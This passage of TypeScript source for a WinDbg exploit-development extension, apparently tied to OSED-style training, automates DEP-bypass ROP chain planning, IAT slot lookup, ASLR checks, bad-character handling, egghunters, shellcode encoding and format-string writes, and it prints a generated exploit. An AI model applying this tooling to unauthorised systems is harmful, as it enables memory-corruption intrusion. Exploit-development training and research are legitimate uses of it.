      if (warnings.length === 0) out.info(`${entry.label} spans ${dwordHex(first)} to ${dwordHex(last)}: no ASLR, and its fixed high bytes are clean. The scan in [3/${n}] drops each address whose low bytes are bad.`);
      moduleWarnings.push(...warnings);
    }
    if (named.length === 0) {
      const fixedOut = candidates.filter((entry) => entry.why !== undefined && entry.info.aslr !== "enabled");
      const moving = candidates.filter((entry) => entry.info.aslr === "enabled").length;
      out.info(`Gadgets come from every module that can give one: ${modulesLabel}. Not usable: ${[...fixedOut.map((entry) => `${entry.label}, ${entry.why}`), `${moving} with ASLR`].join("; ")}.`);
    }
    printBlock(HELPER_BLOCK);
    const unusable = chosen.find((entry) => entry.why !== undefined);
    if (chosen.length === 0) {
      const fixedOut = candidates.filter((entry) => entry.info.aslr !== "enabled");
      stop("module", `no loaded module can give gadgets: ${fixedOut.length > 0 ? fixedOut.map((entry) => `${entry.label} (${entry.why})`).join(", ") : "every one has ASLR"}${fixedOut.length > 0 ? ", and the rest have ASLR" : ""}.`,
        ...(candidates.some((entry) => entry.info.aslr === "enabled") ? leakNext() : []));
    } else if (unusable?.info.aslr === "enabled") {
      stop("module", `${unusable.label} has ASLR: every gadget address in it moves on each run, so no chain built from it survives a reboot. This is the one case where you change module, and the API stays as it is.`, ...usableNext());
    } else if (unusable) {
      stop("module", `${unusable.why?.replace(/^every address/, `every address in ${unusable.label}`)}, so no gadget from it is usable.`, ...usableNext());
    }
    summary.push({ Section: `[1/${n}] module`, Result: moduleWarnings.length === 0 ? "fixed, clean base" : `${moduleWarnings.length} warning(s)` });

    out.section(`[2/${n}] IAT slot of ${depApi}`);
    const iatSlot = route?.slot;
    const slotBad = iatSlot === undefined ? [] : addressBadBytes(BigInt(iatSlot), 4, badSet);
    const owner = route ? shortName(route.owner) : "";
    if (!route) {
      const moving = slotsOf(depApi).filter((row) => !row.fixed).map((row) => shortName(row.owner));
      // He named the API, so another one is an alternative, not a fix: one line, and only if it exists.
      const other = autoApi ? undefined : DEP_PLAN_APIS.filter((name) => name !== depApi).map((name) => routeFor(name, modules, badchars as number[], fixedOwners)).find((found) => found !== undefined);
      stop("API", `no module with ASLR disabled imports ${autoApi ? DEP_PLAN_APIS.join(", ") : depApi}${moving.length > 0 ? ` (${moving.join(", ")} ${moving.length === 1 ? "does, and it has" : "do, and they have"} ASLR)` : ""}, nor any other export of kernel32 or kernelbase to reach it from by a fixed distance. Its address needs a leak first.`,
        ...(other ? [`If you are free to choose the API, ${other.api} has a route: dx @$osed().dep_plan("${other.api}", "${modulesArg}", "${badText}")`] : []));
    } else if (route.delta) {
      const delta = route.delta;
      const signed = delta.value > 0x7fffffff ? `- ${dwordHex(-delta.value >>> 0)}` : `+ ${dwordHex(delta.value)}`;
      out.info(`No module with ASLR disabled imports ${depApi} itself, but ${owner} imports ${delta.dll}!${delta.anchor}, at slot ${dwordHex(route.slot)}. ${depApi} is a fixed distance from it inside ${delta.dll}: ${depApi} = [${dwordHex(route.slot)}] ${signed}, measured now with ${delta.anchor} at ${dwordHex(delta.anchorAt)} and ${depApi} at ${dwordHex(delta.apiAt)}. The chain reads the slot and adds API_DELTA.`);
      const others = delta.others.filter((name, i) => delta.others.indexOf(name) === i);
      out.info(delta.why === "only"
        ? `This is the only slot in a module without ASLR that reaches ${depApi} by a distance.`
        : `Chosen from ${delta.others.length + 1} slots in modules without ASLR that reach ${depApi} by a distance: ${delta.why}. The other ${delta.others.length === 1 ? "one is" : `${delta.others.length} are`} in ${others.join(", ")}.`);
      const moving = slotsOf(depApi).filter((row) => !row.fixed).map((row) => shortName(row.owner)).filter((name, i, all) => all.indexOf(name) === i);
      if (moving.length > 0) out.info(`${moving.join(", ")} ${moving.length === 1 ? "imports" : "import"} ${depApi} itself, but ${moving.length === 1 ? "has ASLR: its slot moves" : "they have ASLR: their slots move"} on every boot. No slot in a module with ASLR anchors the distance either.`);
      out.warn(`That distance holds for this build of ${delta.dll} only. Any Windows update moves it, so the exploit is right for the machine it was measured on: run this again on the target.`);
      const direct = DEP_PLAN_APIS.filter((name) => name !== depApi).map((name) => directRoute(name, modules)).find((other) => other !== undefined);
      if (direct) out.info(`If you are free to choose the API, ${direct.api} needs no distance: ${shortName(direct.owner)} imports it at ${dwordHex(direct.slot)}. dx @$osed().dep_plan("${direct.api}", "${modulesArg}", "${badText}")`);
    } else {
      out.echo("sc.iat_find", [depApi]);
      (api.sc as { iat_find: (symbol: string) => unknown }).iat_find(depApi);
      out.info(`Slot ${dwordHex(route.slot)} in ${owner}. The chain reads the API address from it with mov eax, [eax].`);
      if (!modules.some((module) => sameModule(route.owner, module))) out.warn(`${modulesLabel} does not import ${depApi}; this slot belongs to ${owner}, which does not move either. The IAT you read and the modules your gadgets come from are independent.`);
    }
    if (route && slotBad.length > 0) out.info(`The slot address holds the bad byte(s) ${byteList(slotBad)}. That is the usual case and nothing breaks: [5/${n}] builds the address from clean constants and the chain never sends it raw.`);
    else if (route) out.info("The slot address has no bad byte, so it can be popped as it is.");
    printBlock(slotBlock(depApi, owner || modulesLabel, iatSlot, badchars as number[], route?.delta).block);
    summary.push({ Section: `[2/${n}] IAT slot`, Result: iatSlot === undefined ? "no route" : `${dwordHex(iatSlot)}${route?.delta ? ` + delta via ${route.delta.anchor}` : ""}${slotBad.length > 0 ? " (bad bytes)" : ""}` });

    // A module that can give no gadget makes the corpus and the picks meaningless, and scanning it costs time.
    const moduleFailed = blocker !== undefined && (blocker as { layer: Layer }).layer === "module";
    out.section(`[3/${n}] Gadget corpus from ${modulesLabel}`);
    let scanned: CapabilityIndex | undefined;
    if (moduleFailed) out.error("Skipped: no module here can give gadgets. See the STOP above.");
    else if (loadedCorpusCovers(modules, badchars as number[])) {
      scanned = currentRopCorpus;
      out.info(`Using the corpus already loaded: a complete live scan of ${modulesLabel} for these bad chars, so scanning again could only find the same gadgets.`);
    } else {
      out.echo("rop.scan_live", [modulesArg, badText]);
      executeRopScanLive(modulesArg, badText);
      scanned = currentRopCorpus;
    }
    const gadgetCount = scanned?.gadgets.length ?? 0;
    if (!moduleFailed) out.info(`${gadgetCount} gadgets and ${scanned ? summarizeCapabilities(scanned).length : 0} capabilities, every address free of the bad bytes.`);
    printBlock(CORPUS_BLOCK);
    summary.push({ Section: `[3/${n}] corpus`, Result: moduleFailed ? "skipped" : `${gadgetCount} gadgets` });

    // The caves are found here so the [4/7] block can name them; [5/7] prints what this found.
    const { writable, cave } = frameAddresses(modules, badText, depApi, moduleFailed);

    const solved = moduleFailed ? undefined
      : solveStyles(scanned, modules, badchars as number[], exclude, depApi, { iatSlot, delta: route?.delta?.value, writable, cave });
    const style: DepPlanStyle = styleText === "auto" ? (solved ? chooseStyle(solved) : "skeleton") : styleText as DepPlanStyle;
    const corpus = solved?.corpus;
    const otherBlocked = solved ? titles(solved.plans[otherStyle(style)].filter((plan) => !met(plan))) : "";
    out.section(`[4/${n}] The gadget picked per job (${style} style${styleText === "auto" && otherBlocked ? `: the ${otherStyle(style)} style lacks ${otherBlocked}` : ""})`);
    let plans: JobPlan[] = [];
    let jmpEsp: number | undefined;
    let missing: string[] = [];
    if (solved) {
      out.echo("dep_candidates", [modulesArg, badText, style, depApi]);
      if (exclude.length > 0) out.info(`Excluding ${exclude.length} gadget(s) by request: ${exclude.map(dwordHex).join(", ")}. The chain is solved again without them, so other jobs may pick differently.`);
      ({ plans, jmpEsp, missing } = printDepCandidates(solved, modules, badSet, style, depApi, exclude));
    } else out.error("Skipped: there is no corpus. See the STOP above.");
    // Where ESP landed after the crashing ret, read off the stack now, while it is the crash: a `ret 4`
    // puts the chain's second dword one further on, and nothing in the crash input says so but this.
    const regs = readRegisters(4);
    const landing = measureLanding(regs.ip === undefined ? undefined : Number(regs.ip) >>> 0, regs.sp === undefined ? undefined : Number(regs.sp) >>> 0, (address) => {
      const bytes = tryReadMemory(BigInt(address), 4);
      return bytes && bytes.length === 4 ? (bytes[0] | (bytes[1] << 8) | (bytes[2] << 16) | (bytes[3] << 24)) >>> 0 : undefined;
    });
    // The loaders search the corpus without the excluded gadgets, so one cannot come back under another name.
    const build = buildExploit({
      api: depApi, style, module: modulesLabel, badchars: badchars as number[], index: corpus, plans,
      iatSlot, delta: route?.delta, writable, cave, jmpEsp, stage, exclude, landing,
    });
    if (solved) printBlock(build.blocks[4]);
    summary.push({ Section: `[4/${n}] candidates`, Result: !solved ? "skipped" : missing.length === 0 ? "every job has one" : `missing ${missing.length}` });

    out.section(`[5/${n}] Clean recipes for the constants`);
    if (blocker) out.error(`Skipped: these are the arguments of a ${depApi} call this chain cannot make. See the STOP above.`);
    for (const constant of blocker ? [] : CONSTANTS[depApi]) {
      out.info(`${constant.field} = ${dwordHex(constant.value)}`);
      out.echo("rop.construct", ["eax", out.hex(constant.value), badText]);
      executeRopConstruct("eax", constant.value, badText);
    }
    for (const [label, value] of [["IAT slot", iatSlot], ["API_DELTA", route?.delta?.value]] as Array<[string, number | undefined]>) {
      if (blocker || value === undefined || addressBadBytes(BigInt(value), 4, badSet).length === 0) continue;
      out.info(`${label} = ${dwordHex(value)}`);
      out.echo("rop.construct", ["eax", out.hex(value), badText]);
      executeRopConstruct("eax", value, badText);
    }
    if (depApi !== "VirtualAlloc" && !blocker) {
      const field = depApi === "VirtualProtect" ? "lpflOldProtect" : "lpNumberOfBytesWritten";
      out.echo("code_caves", [modules[0], out.hex(4), 25, badText, "STAGING"]);
      if (writable === undefined) out.warn(`${field}: no clean writable cave in ${modulesLabel}. Try dx @$osed().code_caves("", 4, 25, "${badText}", "STAGING").`);
      else out.info(`${field} = ${dwordHex(writable)}, a writable cave with no bad byte (code_caves STAGING).`);
    }
    if (depApi === "WriteProcessMemory" && !blocker) {
      out.echo("code_caves", [modules[0], out.hex(0x210), 25, badText, "EXEC"]);
      if (cave === undefined) out.warn(`Code cave: none of 0x210 bytes with a clean address in ${modulesLabel}. Try dx @$osed().code_caves("", 0x210, 25, "${badText}", "EXEC").`);
      else out.info(`Code cave (return address and lpBaseAddress) = ${dwordHex(cave)}, executable (code_caves EXEC).`);
    }
    // One line per loader before the loaders themselves: which gadgets the search chose, in order, and
    // why that route and not a shorter one. Their addresses and disassembly are the [4/7] table, so this
    // stays a route and never repeats it. The recipes printed above are for eax alone and are a reference
    // for building each constant by hand; what the chain does to each register is this list.
    if (!blocker && build.routes.length > 0) {
      out.info(`The recipes above build each constant in eax, as a reference. What the chain does is below: one line per register, searched through ${modulesLabel} rather than following one recipe.`);
      for (const route of build.routes) out.info(`  ${route}`);
    }
    if (!blocker) printBlock(build.blocks[5]);
    summary.push({ Section: `[5/${n}] constants`, Result: blocker ? "skipped" : `${CONSTANTS[depApi].length} recipes` });

    out.section(`[6/${n}] ${style === "pushad" ? "PUSHAD register map" : "Call frame"} for ${depApi}`);
    if (blocker) {
      out.error(`Skipped: this is the frame of a ${depApi} call this chain cannot make. See the STOP above.`);
    } else {
      const frameArgs = style === "pushad" ? [depApi, style] : [depApi];
      out.echo("dep_function", frameArgs);
      invoke("dep_function", frameArgs);
      out[landing.measured ? "info" : "warn"](`ESP after the crashing ret: ${landing.how}.`);
      out[landing.measured ? "info" : "warn"](!landing.measured ? "Run dep_plan at the crash, or find the EIP dword with dds esp-10 L8 and set RET_GAP."
        : landing.gap === 0 ? "The chain's second dword sits right after EIP." : `The chain's second dword sits at OFFSET + ${4 + landing.gap}: RET_GAP puts ${landing.gap} junk bytes after the first gadget.`);
      printBlock(build.blocks[6]);
    }
    summary.push({ Section: `[6/${n}] frame`, Result: blocker ? "skipped" : style === "pushad" ? "register map" : "dep_function frame" });

    out.section(`[7/${n}] The exploit, with a placeholder for every value only a run can give`);
    if (blocker) {
      out.error("Skipped: there is no chain to write. See the STOP above.");
    } else {
      // One hole per line. Joined into one sentence they ran off the screen, and this is the first line
      // of the section he photographs as the exploit.
      if (build.holes.length === 0) out.info("Nothing left to measure: paste the seven blocks and the file runs.");
      else {
        out.info(`${build.holes.length} hole(s) to fill, each a hole(...) line with the reason in the comment above it:`);
        for (const hole of build.holes) out.info(`  ${hole}`);
      }
      printBlock(build.blocks[7]);
    }
    summary.push({ Section: `[7/${n}] exploit`, Result: blocker ? "skipped" : build.holes.length === 0 ? "no holes" : `${build.holes.length} hole(s)` });

    // The method layer is judged last and on both styles, because only the whole corpus can rule it out.
    if (!blocker && solved && missing.length > 0 && solved.plans[otherStyle(style)].some((plan) => !met(plan))) {
      const lacks = (name: DepPlanStyle): string => `the ${name} style lacks ${titles(solved.plans[name].filter((plan) => !met(plan)))}`;
      blocker = { layer: "method", what: `no style has a gadget for every job in ${modulesLabel}: ${lacks("skeleton")}, and ${lacks("pushad")}. Each was searched for in every byte of it.`, next: [] };
    }
    // Again at the end: the first one is 300 lines up by now.
    const ending = blocker as { layer: Layer; what: string; next: string[] } | undefined;
    if (ending) {
      out.section(`STOP: no ${depApi} chain from ${modulesLabel}`);
      out.error(`The ${ending.layer} layer fails: ${ending.what}`);
      for (const line of ending.next) out.error(line);
    } else if (missing.length > 0) {
      out.section("Verdict");
      out.warn(`No complete ${depApi} chain in the ${style} style: ${modulesLabel} has no gadget for ${missing.join(", ")}, so [7/7] holds a hole for each. The ${otherStyle(style)} style has a gadget for every job: ${out.dxCall("dep_plan", [depApi, modulesArg, badText, otherStyle(style), stage, ...(excludeText || anyway ? [excludeText] : []), ...(anyway ? [true] : [])])}`);
    } else {
      out.section("Verdict");
      out.info(`A ${depApi} chain from ${modulesLabel} in the ${style} style${route?.delta ? `, the API reached from ${route.delta.dll}!${route.delta.anchor} by a distance measured on this machine` : ""}${build.holes.length > 0 ? `, with ${build.holes.length} hole(s) to fill` : ""}.`);
      out.info(`The same run with every choice written out: ${out.dxCall("dep_plan", callArgs(style, anyway))}`);
    }

    setResult({
      command: "dep_plan",
      args: { api: depApi, module: modulesArg, badchars: badText, style },
      success: ending === undefined && missing.length === 0,
      findings: [{ api: depApi, module: modulesArg, style, dep: dep.enforced, iatSlot, delta: route?.delta?.value, writable, cave, gadgets: gadgetCount, missing, holes: ending ? [] : build.holes }],
      warnings: [...moduleWarnings, ...(missing.length > 0 ? [`No candidate for: ${missing.join(", ")}`] : [])],
      errors: ending ? [`The ${ending.layer} layer fails: ${ending.what}`, ...ending.next] : [],
    });
    return toDxResult("DEP Plan", summary);
  };

  for (const command of registry.getAll()) {
    api[command.name] = (...args: unknown[]) => {
      return invoke(command.name, args);
    };
  }

  api.rop = {
    find: (...args: unknown[]) => {
      if (args.length === 1 && args[0] === "help") {
        return helperHelp("rop.find");
      }
      return invoke("rop", args);
    },
    scan: executeRopScan,
    scan_live: executeRopScanLive,
    corpus: {
      export: executeCorpusExport,
      report: executeCorpusReport,
      import: executeCorpusImport,
      validate: executeCorpusValidate,
      lookup: executeCorpusLookup,
    },
    query: executeRopQuery,
    capabilities: executeRopCapabilities,
    plan: executeRopPlan,
    emit: executeRopEmit,
    synthesize: executeRopSynthesize,
    export: executeRopExport,
    pivots: executeRopPivots,
    chain: executeRopChain,
    construct: executeRopConstruct,
    setup: executeRopSetup,
    chain_vp: executeRopChainVp,
    chain_wpm: executeRopChainWpm,
    chain_va: executeRopChainVa,
    frame_vp: executeRopFrameVp,
    frame_wpm: executeRopFrameWpm,
    frame_va: executeRopFrameVa,
    frame_write: executeRopFrameWrite,
    slot_call: executeRopSlotCall,
    api_plan: executeRopApiPlan,
    api_build: executeRopApiBuild,
    generate: executeRopGenerate,
    verify: executeRopVerify,
    prove: executeRopProve,
  };
  api.leak = {
    classify: (...args: unknown[]) => {
      if (args.length === 1 && args[0] === "help") return helperHelp("leak.classify");
      return invoke("leak_classify", args);
    },
    scan: (...args: unknown[]) => {
      if (args.length === 1 && args[0] === "help") return helperHelp("leak.scan");
      return invoke("leak_scan", args);
    },
    analyze: (...args: unknown[]) => {
      if (args.length === 1 && args[0] === "help") return helperHelp("leak.analyze");
      return invoke("leak_analyze", args);
    },
    base: (...args: unknown[]) => {
      if (args.length === 1 && args[0] === "help") return helperHelp("leak.base");
      return invoke("leak_base", args);
    },
  };
  api.rop_template = (...args: unknown[]) => {
    if (!(args.length === 1 && args[0] === "help")) out.section(out.dxCall("rop_template", args));
    return invoke("rop_template", args);
  };
  api.rop_find = (...args: unknown[]) => invoke("rop", args);
  api.dep_plan = executeDepPlan;
  api.dep_candidates = executeDepCandidates;
  api.palette = executePalette;

  // exploit.state and exploit.clear make exploit an object, which shadows the
  // registry command of the same name. The workflow command sits beside them so
  // every exploit call uses the object-method path dx already resolves.
  api.exploit = {
    workflow: (...args: unknown[]) => {
      if (args.length === 1 && args[0] === "help") return helperHelp("exploit.workflow");
      return invoke("exploit", args);
    },
    state: executeExploitState,
    clear: executeExploitClear,
  };

  api.pattern = {
    create: (...args: unknown[]) => invoke("pattern_create", args),
    offset: (...args: unknown[]) => invoke("pattern_offset", args),
  };
  api.seh = {
    visualize: (...args: unknown[]) => invoke("seh", args),
  };
  api.fmt = {
    build: (...args: unknown[]) => invoke("fmt_build", args),
    offset: (...args: unknown[]) => invoke("fmt_offset", args),
    inspect: (...args: unknown[]) => {
      if (args.length === 1 && args[0] === "help") return helperHelp("fmt.inspect");
      return invoke("fmt_inspect", args);
    },
  };
  api.str = {
    read: (...args: unknown[]) => {
      invoke("str_read", args.length === 0 ? args : [commandAddress(args[0]), ...args.slice(1)]);
      return lastResult?.findings[0];
    },
    find: (...args: unknown[]) => {
      invoke("str_find", args);
      return lastResult?.findings;
    },
    refs: (...args: unknown[]) => {
      const target = typeof args[0] === "string" && /^(0x)?[0-9a-f`]+$/i.test(args[0].trim())
        ? commandAddress(args[0])
        : args[0];
      invoke("str_refs", args.length === 0 ? args : [target, ...args.slice(1)]);
      return lastResult?.findings;
    },
    bytes: (...args: unknown[]) => {
      invoke("str_bytes", args);
      return lastResult?.findings[0];
    },
  };

  api.last_result = () => lastResult;
  api.version = (...args: unknown[]) => {
    if (args.length === 1 && args[0] === "help") {
      return invoke("version", args);
    }
    invoke("version", []);
    return getVersionInfo();
  };
  api.last_summary = () => {
    if (!lastResult) {
      return {
        success: false,
        command: "",
        warnings: 0,
        errors: 0,
        findings: 0,
      };
    }
    return {
      success: lastResult.success,
      command: lastResult.command,
      warnings: lastResult.warnings.length,
      errors: lastResult.errors.length,
      findings: lastResult.findings.length,
    };
  };
  api.clear_last_result = () => {
    lastResult = undefined;
    return true;
  };

  const writer = (name: string, command: string) => (...args: unknown[]) =>
    args.length === 1 && args[0] === "help" ? helperHelp(name) : invoke(command, args);
  api.sc = {
    ...sc,
    push_string: writer("sc.push_string", "sc_push_string"),
    call_frame: writer("sc.call_frame", "sc_call_frame"),
    template: writer("sc.template", "sc_template"),
    builder: writer("sc.builder", "sc_builder"),
  };

  const analysisAddress = (value: unknown): bigint => {
    if (typeof value === "bigint" && value >= BigInt(0)) return value;
    if (typeof value === "number" && Number.isInteger(value) && value >= 0) return BigInt(value);
    if (typeof value === "string" && /^(0x)?[0-9a-f`]+$/i.test(value.trim())) {
      return BigInt(`0x${value.trim().replace(/^0x/i, "").replace(/`/g, "")}`);
    }
    throw new Error("Address must be a non-negative integer, bigint, or hex string.");
  };

  const commandAddress = (value: unknown): number | string => {
    const address = analysisAddress(value);
    return address <= BigInt(Number.MAX_SAFE_INTEGER) ? Number(address) : `0x${address.toString(16)}`;
  };
  api.memory = (address: unknown) => {
    invoke("memory", [commandAddress(address)]);
    return lastResult?.findings[0];
  };
  api.can_execute = (address: unknown) => {
    const evidence = (api.memory as (value: unknown) => { executable?: boolean | null } | undefined)(address);
    return evidence?.executable ?? null;
  };
  api.landing = (address?: unknown) => {
    invoke("landing", address === undefined ? [] : [commandAddress(address)]);
    const evidence = lastResult?.findings[0] as SerializedLandingEvidence | undefined;
    return evidence ? toDxResult("Landing Evidence", landingDxRows(evidence)) : undefined;
  };
  api.math = (...args: unknown[]) => {
    invoke("math", args);
    return lastResult?.findings[0];
  };

  const explainState = {
    getLast: () => lastResult,
    setLast: (result: CommandResult | undefined) => {
      lastResult = result;
    },
  };
  api.explain = createExplainCommand(api, explainState as ExplainState);
  wrapApi(api, explainState as ExplainState);
  return api;
}

function parseScanLivePositionalArgs(args: unknown[]): Record<string, unknown> {
  const result: Record<string, unknown> = { module: args[0] };
  result.badchars = parseHexByteList(args[1]);
  // Stable DX positional form: module, badchars, append, maxPerPattern,
  // maxInstructionsPerGadget. Retain the legacy numeric third argument.
  if (typeof args[2] === "number") {
    result.maxPerPattern = args[2];
    result.append = args[3];
    result.maxInstructionsPerGadget = args[4];
  } else {
    result.append = args[2];
    result.maxPerPattern = args[3];
    result.maxInstructionsPerGadget = args[4];
  }
  result.maxBackwardGadgets = args[5];
  return result;
}

function isPlainObject(value: unknown): value is Record<string, unknown> {
  return typeof value === "object" && value !== null && !Array.isArray(value);
}

function parseRegisterList(value: unknown): string[] {
  const raw = Array.isArray(value)
    ? value.map((v) => String(v))
    : typeof value === "string"
      ? value.split(/[,\s]+/)
      : [];
  return raw.map((r) => r.trim().toLowerCase()).filter((r) => r.length > 0);
}

function parseRegisterTargets(value: unknown): Record<string, number> {
  const targets: Record<string, number> = {};
  // Object form (programmatic / SDK use): {edi: 0x10001000, ebx: 0x40}
  if (isPlainObject(value)) {
    for (const [key, raw] of Object.entries(value as Record<string, unknown>)) {
      const n = Number(raw);
      if (Number.isFinite(n)) targets[key.trim().toLowerCase()] = n >>> 0;
    }
    return targets;
  }
  // String form (WinDbg dx-friendly): "edi=0x10001000 ebx=0x40" (= or :, any of space/comma/semicolon)
  if (typeof value === "string") {
    for (const pair of value.split(/[\s,;]+/).filter((p) => p.length > 0)) {
      const match = /^([a-zA-Z]+)\s*[=:]\s*(.+)$/.exec(pair);
      if (!match) continue;
      const reg = match[1].trim().toLowerCase();
      const raw = match[2].trim();
      const n = /^0x[0-9a-fA-F]+$/.test(raw) ? parseInt(raw, 16) : Number(raw);
      if (Number.isFinite(n)) targets[reg] = n >>> 0;
    }
  }
  return targets;
}

function parseHexByteList(value: unknown): number[] | unknown {
  if (Array.isArray(value)) {
    return value;
  }
  if (typeof value !== "string") {
    return value;
  }
  const tokens = value.split(/[,\s]+|(?=\\x)/i).filter((token) => token.length > 0);
  if (tokens.length === 0) {
    return [];
  }
  const parsed: number[] = [];
  for (const token of tokens) {
    const pair = /^(?:\\x|0x)?([0-9a-fA-F]{2})$/i.exec(token);
    if (pair) {
      parsed.push(parseInt(pair[1], 16));
      continue;
    }

    if (/^[0-9a-fA-F]+$/.test(token) && token.length % 2 === 0) {
      for (let i = 0; i < token.length; i += 2) {
        parsed.push(parseInt(token.slice(i, i + 2), 16));
      }
      continue;
    }

    return value;
  }
  return parsed;
}

export function normalizeInvocation(commandName: string, args: unknown[]): Record<string, unknown> {
  if (args.length === 0 || (args.length === 1 && args[0] === undefined)) {
    return {};
  }

  if (args.length === 1 && isPlainObject(args[0])) {
    return args[0];
  }

  switch (commandName) {
    case "help":
      return { command: args[0], mode: args[1] };
    case "pattern_create":
      return { length: args[0], type: args[1] };
    case "pattern_offset":
      return { value: args[0], type: args[1] };
    case "badchars":
      return { address: args[0], exclude: parseHexByteList(args[1]) };
    case "badchar_array":
      return { exclude: parseHexByteList(args[0]) };
    case "badchar_function":
      return { exclude: parseHexByteList(args[0]), space: args[1] };
    case "badchar_find":
      return {
        address: args[0],
        exclude: parseHexByteList(args[1]),
        windowBytes: args[2],
        minRun: args[3],
        start: args[4],
        size: args[5],
      };
    case "egghunter":
      return { tag: args[0], mode: args[1], wow64: args[2], badchars: parseHexByteList(args[3]), os: args[4], syscall: args[5] };
    case "exploit":
      return { mode: args[0], tag: args[1], offset: args[2], address: args[3] };
    case "findmsp":
      return { patternLength: args[0], stackBytes: args[1], probeBytes: args[2] };
    case "modules":
      return { filter: args[0] };
    case "code_caves":
      return { module: args[0], minSize: args[1], maxResults: args[2], badChars: args[3], capability: args[4] };
    case "math":
      return { value: args[0], bits: args[1] };
    case "str_read":
      return { address: args[0], max: args[1], encoding: args[2] };
    case "str_find":
      return { text: args[0], module: args[1], encoding: args[2], maxResults: args[3] };
    case "str_refs":
      return { target: args[0], module: args[1], encoding: args[2], maxResults: args[3] };
    case "str_bytes":
      return { text: args[0], encoding: args[1], terminator: args[2], exclude: parseHexByteList(args[3]) };
    case "rop":
      return { module: args[0], maxResults: args[1], executableOnly: args[2], mode: args[3] };
    case "rop_suggest":
    case "pivots":
    case "retn":
    case "add_esp": {
      const slots = badcharSlotArgs(args, 2);
      const scan = {
        module: slots[0],
        maxResults: slots[1],
        badchars: parseHexByteList(slots[2]),
        executableOnly: slots[3],
        mode: slots[4],
      };
      return commandName === "rop_suggest" ? { ...scan, engine: slots[5] } : scan;
    }
    case "nop":
      return { length: args[0], byte: args[1] };
    case "rop_template":
      return { api: args[0], module: args[1], style: args[2] };
    case "dep_function":
      return { method: args[0], style: args[1] };
    case "sc_push_string":
      return { text: args[0], badchars: args[1], register: args[2] };
    case "sc_call_frame": {
      const { rest, bad } = splitBadToken(args.slice(1));
      return { api: args[0], args: rest, badchars: bad };
    }
    case "sc_template":
    case "sc_builder":
      return { tasks: args.map(String) };
    case "fmt_build":
      // Positional single-write form for the dx REPL, which cannot pass object/array literals.
      // Multi-write callers use the object form (handled by the isPlainObject passthrough above).
      return {
        writes: [{ addr: args[0], value: args[1] }],
        argIndex: args[2],
        width: args[3],
        exclude: parseHexByteList(args[4]),
        prefix: args[5],
      };
    case "fmt_offset":
      return { marker: args[0], count: args[1], firstArg: args[2] };
    case "fmt_inspect":
      return { family: args[0], formatArgOffset: args[1], max: args[2] };
    case "encode":
      return {
        shellcode: args[0],
        exclude: parseHexByteList(args[1]),
        key: args[2],
      };
    case "find_bytes": {
      const slots = badcharSlotArgs(args, 3);
      return {
        module: slots[0],
        bytes: parseHexByteList(slots[1]),
        maxResults: slots[2],
        badchars: parseHexByteList(slots[3]),
        executableOnly: slots[4],
        mode: slots[5],
      };
    }
    case "find_stack_bytes":
      return {
        bytes: parseHexByteList(args[0]),
        maxResults: args[1],
        stackBytes: args[2],
      };
    case "find_mem_bytes":
      return {
        address: args[0],
        length: args[1],
        bytes: parseHexByteList(args[2]),
        maxResults: args[3],
      };
    case "find_ptr":
      return {
        instruction: args[0],
        module: args[1],
        badchars: parseHexByteList(args[2]),
        maxResults: args[3],
        executableOnly: args[4],
      };
    case "reload":
    case "seh":
      return {};
    case "seh_ppr":
      return {
        module: args[0],
        exclude: parseHexByteList(args[1]),
        maxResults: args[2],
        executableOnly: args[3],
        mode: args[4],
      };
    case "stackmap":
      return {
        depth: args[0],
        patternLength: args[1],
      };
    case "triage":
      return {
        patternLength: args[0],
        badchars: parseHexByteList(args[1]),
        module: args[2],
        stackBytes: args[3],
      };
    case "memory":
    case "landing":
      return { address: args[0] };
    case "leak_classify":
      return { value: args[0] };
    case "leak_scan":
      return { address: args[0], length: args[1] };
    case "leak_analyze":
      return { text: args[0] };
    case "leak_base":
      return { pointer: args[0], rva: args[1] };
    default:
      return { value: args[0] };
  }
}

function initialize(): void {
  currentRopCorpus = undefined;
  cachedExploitState = undefined;
  invalidateCorpusPlans();
  resetCorpusModules();
  proofSessionStore = new ProofSessionStore();
  lastGeneratedProofInput = undefined;
  registry.setReloader(() => {
    currentRopCorpus = undefined;
    cachedExploitState = undefined;
    invalidateCorpusPlans();
    resetCorpusModules();
    proofSessionStore = new ProofSessionStore();
    lastGeneratedProofInput = undefined;
    registerAll();
    osed = bindApi();
    publishOsed();
  });

  registerAll();
  osed = bindApi();
  publishOsed();
}

export function initializeScript(): unknown[] {
  const registrations: unknown[] = [];
  const hostAny = host as unknown as {
    apiVersionSupport?: new (major: number, minor: number) => unknown;
    functionAlias?: new (fn: (...args: unknown[]) => unknown, aliasName: string) => unknown;
  };

  if (hostAny.apiVersionSupport) {
    registrations.push(new hostAny.apiVersionSupport(1, 7));
  }

  initialize();

  if (hostAny.functionAlias) {
    try {
      registrations.push(new hostAny.functionAlias(() => osed, "osed"));
    } catch (error) {
      const message = error instanceof Error ? error.message : String(error);
      const globalObject = getGlobalObject();
      if (globalObject) {
        globalObject.osed = osed;
      }
      if (typeof host !== "undefined" && host.diagnostics && typeof host.diagnostics.debugLog === "function") {
        host.diagnostics.debugLog(`osed: functionAlias registration failed, using global object fallback: ${message}\n`);
      }
    }
  }

  if (typeof host !== "undefined" && host.diagnostics && typeof host.diagnostics.debugLog === "function") {
    const version = getVersionInfo();
    const dirty = version.gitDirty ? "dirty" : "clean";
    host.diagnostics.debugLog(
      `[+] osed loaded: v${version.version} (${version.gitCommit}, ${dirty}, built ${version.buildTime})\n`,
    );
  }

  return registrations;
}
